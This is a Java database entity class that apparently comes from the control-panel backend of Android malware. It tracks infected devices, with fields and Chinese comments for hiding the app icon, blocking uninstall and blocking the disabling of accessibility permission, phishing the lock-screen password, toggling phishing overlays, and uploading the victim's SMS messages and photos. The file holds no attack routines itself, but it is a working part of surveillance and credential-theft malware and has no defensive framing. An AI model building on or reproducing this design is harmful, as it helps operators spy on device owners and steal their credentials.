package io.renren.modules.app.entity;

import java.util.Date;

import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableName;
import com.baomidou.mybatisplus.extension.handlers.FastjsonTypeHandler;
import com.fasterxml.jackson.annotation.JsonFormat;

import lombok.Data;
import lombok.EqualsAndHashCode;

@Data
@EqualsAndHashCode(callSuper = false)
@TableName(value = "ast_device", autoResultMap = true)
public class Device extends AppBaseEntity {
    private String deviceId;

    //包名
    private String pkg;
    //手机型号
    private String model;

    private String language;
    private String systemVersion;
    private String sdkVersion;
    private String brand;

    private Integer screenWidth;
    private Integer screenHeight;
    //分辨率?
    private String ip;
    
    private String addr;

    //链接 状态 0：离线  1：在线
    private Integer status;

    //链接 状态 0：离线  1：在线
    private Integer connectStatus;

    //锁屏
    @TableField(typeHandler = FastjsonTypeHandler.class)
    private JSONObject lockScreen;

    //是否固定锁屏密码 手势可能存在不稳定
    private Integer fixLockScreen;

    //手动操作次数
    private Integer manualCount;
    //系统指纹
    private String fingerprint;


    @JsonFormat(pattern = "yyyy-MM-dd HH:mm:ss", timezone = "GMT+8")
    private Date lastHeart;

    //是否启用无障碍权限
    private Integer accessibilityServiceEnabled;
    
    private String remark;

    //是否隐藏图标
    private Integer hideIcon;

    //是否阻止关闭无障碍权限
    private Integer accessibilityGuard;
    //是否阻止卸载
    private Integer uninstallGuard;
    
    //锁屏密码钓鱼
    private Integer unlockFish;
    
    @TableField("`kill`")
    private Integer kill; //0：未杀  1： 已杀

    //上传短信
    private Integer uploadSms;
    //上传相册
    private Integer uploadAlbum;
    //钓鱼开关
    //{"code":boolean}
    @TableField(typeHandler = FastjsonTypeHandler.class)
    private JSONObject fishSwitch;

    @TableField(typeHandler = FastjsonTypeHandler.class)
    private JSONObject permissions;
    
    private Integer uplog; //0:不开启日志 1：开启日志上传


}
